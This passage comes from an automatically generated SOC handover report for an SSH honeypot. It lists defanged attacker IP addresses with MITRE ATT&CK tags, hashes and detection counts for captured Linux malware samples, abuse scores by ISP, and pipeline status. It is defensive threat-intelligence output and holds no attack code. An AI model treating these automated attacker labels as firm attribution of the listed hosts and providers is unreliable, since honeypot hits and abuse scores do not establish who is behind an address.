| `120.48.80[.]70` | 1 | 2026-03-16 07:29 | 2026-03-16 07:30 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `134.199.171[.]191` | 1 | 2026-03-16 01:11 | 2026-03-16 01:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `138.97.64[.]146` | 1 | 2026-03-16 02:30 | 2026-03-16 02:31 | 14s | 0 | `T1592` | 🟢 LOW |
| `151.48.3[.]141` | 1 | 2026-03-16 05:27 | 2026-03-16 05:27 | 14s | 0 | `T1592` | 🟢 LOW |
| `153.178.184[.]51` | 1 | 2026-03-16 03:43 | 2026-03-16 03:44 | 30s | 0 | `T1592` | 🟢 LOW |
| `160.242.105[.]108` | 1 | 2026-03-16 06:45 | 2026-03-16 06:45 | 30s | 0 | `T1592` | 🟢 LOW |
| `167.86.67[.]225` | 1 | 2026-03-16 13:48 | 2026-03-16 13:48 | 8s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-03-16 14:05 | 2026-03-16 14:05 | 10s | 0 | `T1592` | 🟢 LOW |
| `179.185.29[.]233` | 1 | 2026-03-16 10:31 | 2026-03-16 10:31 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.189.85[.]66` | 1 | 2026-03-16 12:11 | 2026-03-16 12:11 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.33.186[.]150` | 1 | 2026-03-16 07:49 | 2026-03-16 07:49 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.149.212[.]146` | 1 | 2026-03-16 06:02 | 2026-03-16 06:02 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.166.162[.]78` | 1 | 2026-03-16 03:48 | 2026-03-16 03:48 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.182[.]87` | 1 | 2026-03-16 00:32 | 2026-03-16 00:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-03-16 00:28 | 2026-03-16 00:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.134.76[.]186` | 1 | 2026-03-16 08:52 | 2026-03-16 08:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.11[.]192` | 1 | 2026-03-16 09:15 | 2026-03-16 09:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.148[.]181` | 1 | 2026-03-16 02:40 | 2026-03-16 02:40 | 35s | 0 | `T1592` | 🟢 LOW |
| `183.171.47[.]32` | 1 | 2026-03-16 14:34 | 2026-03-16 14:34 | 31s | 0 | `T1592` | 🟢 LOW |
| `183.93.165[.]103` | 1 | 2026-03-16 03:21 | 2026-03-16 03:23 | 100s | 0 | `T1592` | 🟢 LOW |
| `185.255.47[.]190` | 1 | 2026-03-16 14:45 | 2026-03-16 14:45 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.148.187[.]172` | 1 | 2026-03-16 02:42 | 2026-03-16 02:42 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.215.204[.]109` | 1 | 2026-03-16 11:30 | 2026-03-16 11:30 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.33.218[.]186` | 1 | 2026-03-16 12:16 | 2026-03-16 12:16 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.155.225[.]93` | 1 | 2026-03-16 09:16 | 2026-03-16 09:16 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.251.193[.]6` | 1 | 2026-03-16 02:43 | 2026-03-16 02:43 | 2s | 0 | `T1592` | 🟢 LOW |
| `203.204.75[.]226` | 1 | 2026-03-16 02:54 | 2026-03-16 02:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `210.212.28[.]137` | 1 | 2026-03-16 07:10 | 2026-03-16 07:10 | 13s | 0 | `T1592` | 🟢 LOW |
| `210.245.95[.]11` | 1 | 2026-03-16 11:16 | 2026-03-16 11:16 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.20.26[.]201` | 1 | 2026-03-16 08:36 | 2026-03-16 08:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `221.153.12[.]93` | 1 | 2026-03-16 08:04 | 2026-03-16 08:04 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.206.81[.]77` | 1 | 2026-03-16 01:51 | 2026-03-16 01:52 | 13s | 0 | `T1592` | 🟢 LOW |
| `222.252.21[.]240` | 1 | 2026-03-16 02:35 | 2026-03-16 02:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `35.130.111[.]146` | 1 | 2026-03-16 02:38 | 2026-03-16 02:40 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-03-16 10:59 | 2026-03-16 11:00 | 40s | 0 | `T1592` | 🟢 LOW |
| `37.34.181[.]111` | 1 | 2026-03-16 06:19 | 2026-03-16 06:19 | 13s | 0 | `T1592` | 🟢 LOW |
| `37.34.242[.]99` | 1 | 2026-03-16 14:35 | 2026-03-16 14:36 | 15s | 0 | `T1592` | 🟢 LOW |
| `42.113.255[.]234` | 1 | 2026-03-16 00:14 | 2026-03-16 00:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `42.55.12[.]161` | 1 | 2026-03-16 07:41 | 2026-03-16 07:41 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.239.203[.]145` | 1 | 2026-03-16 12:12 | 2026-03-16 12:12 | 31s | 0 | `T1592` | 🟢 LOW |
| `45.61.184[.]133` | 1 | 2026-03-16 11:08 | 2026-03-16 11:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.16.201[.]182` | 1 | 2026-03-16 03:28 | 2026-03-16 03:29 | 30s | 0 | `T1592` | 🟢 LOW |
| `48.214.55[.]51` | 1 | 2026-03-16 08:53 | 2026-03-16 08:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.151[.]67` | 1 | 2026-03-16 05:28 | 2026-03-16 05:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]5` | 1 | 2026-03-16 06:04 | 2026-03-16 06:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.153[.]12` | 1 | 2026-03-16 02:22 | 2026-03-16 02:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.153[.]56` | 1 | 2026-03-16 07:38 | 2026-03-16 07:38 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.108.29[.]102` | 1 | 2026-03-16 04:15 | 2026-03-16 04:15 | 12s | 0 | `T1592` | 🟢 LOW |
| `61.39.73[.]37` | 1 | 2026-03-16 13:09 | 2026-03-16 13:09 | 30s | 0 | `T1592` | 🟢 LOW |
| `65.20.202[.]4` | 1 | 2026-03-16 02:45 | 2026-03-16 02:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.240.236[.]116` | 1 | 2026-03-16 14:51 | 2026-03-16 14:51 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.199[.]65` | 1 | 2026-03-16 05:42 | 2026-03-16 05:42 | 10s | 0 | `T1592` | 🟢 LOW |
| `8.220.132[.]38` | 1 | 2026-03-16 02:25 | 2026-03-16 02:26 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.71.227[.]151` | 1 | 2026-03-16 00:28 | 2026-03-16 00:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.32.139[.]28` | 1 | 2026-03-16 14:35 | 2026-03-16 14:36 | 13s | 0 | `T1592` | 🟢 LOW |
| `98.93.245[.]202` | 1 | 2026-03-16 12:57 | 2026-03-16 12:57 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (9 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `222.252.21[.]240` | VN | Hanoi Post and Telecom Company | **100** ⚠️ | 8 |
| `34.79.154[.]157` | BE | Google LLC | **100** ⚠️ | 0 |
| `197.251.193[.]6` | GH | Ghana Telecommunications Company Limited | **100** ⚠️ | 5 |
| `179.189.85[.]66` | BR | Gold Telecom Ltda | **100** ⚠️ | 42 |
| `14.224.217[.]104` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 3 |
| `112.6.11[.]184` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `125.20.228[.]146` | IN | Bharti Televentures Limited A/c ABTS MP | **100** ⚠️ | 13 |
| `113.219.245[.]57` | CN | CHINANET HUNAN PROVINCE NETWORK | **100** ⚠️ | 12 |
| `200.105.141[.]172` | BO | AXS Bolivia S. A. | **100** ⚠️ | 48 |
| `122.187.225[.]220` | IN | BHARTI TELENET LTD. NEW DELHI | **100** ⚠️ | 31 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 717 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 455 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 177 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 17 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 17 |

---

## 🔕 False Positive Summary (292 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 8 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 8 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 50 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 76 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 26 |
| AbuseIPDB score 6 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 115 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 891 cases |
| Tool 34  | Credential Extractor        | ✅ 632 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 0 fingerprints |
| Tool 36  | Command Clustering          | ✅ 0 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 191 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 292 filtered (32.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 91 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 9 files |
| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 139 priority case(s) shown individually · 109 recon entry/entries in table (34 group(s) consolidating 385 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-16T14:58:29Z_
